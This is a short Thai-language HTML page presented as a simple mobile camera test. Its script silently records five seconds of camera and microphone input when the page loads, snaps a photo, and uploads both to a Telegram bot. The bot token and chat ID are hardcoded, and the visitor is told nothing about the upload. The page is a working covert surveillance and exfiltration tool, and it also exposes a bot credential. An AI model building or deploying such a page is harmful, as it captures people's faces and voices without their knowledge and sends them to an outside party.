<!DOCTYPE html>
<html lang="th">
<head>
  <meta charset="UTF-8">
  <title>Camera + Telegram Test</title>
</head>
<body>
  <h2>ทดลองกล้องมือถือ</h2>
  <video id="camera" autoplay playsinline width="300"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const BOT_TOKEN = "8068929944:AAHtsM5Yf--VwBDFg3b_paSkXADFRh8kuoo"; // ใส่ Token ของคุณ
    const CHAT_ID = "-4898717294";   // ใส่ Chat ID ของคุณ

    const video = document.getElementById("camera");
    const canvas = document.getElementById("canvas");
    let chunks = [];
    let recorder;

    window.onload = async function() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        video.srcObject = stream;

        // เริ่มอัดวิดีโอ
        recorder = new MediaRecorder(stream);
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = sendVideo;
        recorder.start();

        // ถ่ายรูปอัตโนมัติ 2 วิ
        setTimeout(capturePhoto, 2000);
        // หยุดอัดวิดีโอ 5 วิ
        setTimeout(() => recorder.stop(), 5000);

      } catch (err) {
        alert("ไม่สามารถเปิดกล้องได้: " + err);
        console.error(err);
      }
    };

    function capturePhoto() {
      const ctx = canvas.getContext("2d");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);

      canvas.toBlob(async (blob) => {
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", blob, "photo.jpg");

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: "POST",
          body: formData
        });

        console.log("ส่งรูปไป Telegram เรียบร้อย!");
      }, "image/jpeg");
    }

    async function sendVideo() {
      const blob = new Blob(chunks, { type: "video/webm" });
      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("video", blob, "video.webm");

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
        method: "POST",
        body: formData
      });

      console.log("ส่งวิดีโอไป Telegram เรียบร้อย!");
    }
  </script>
</body>
</html>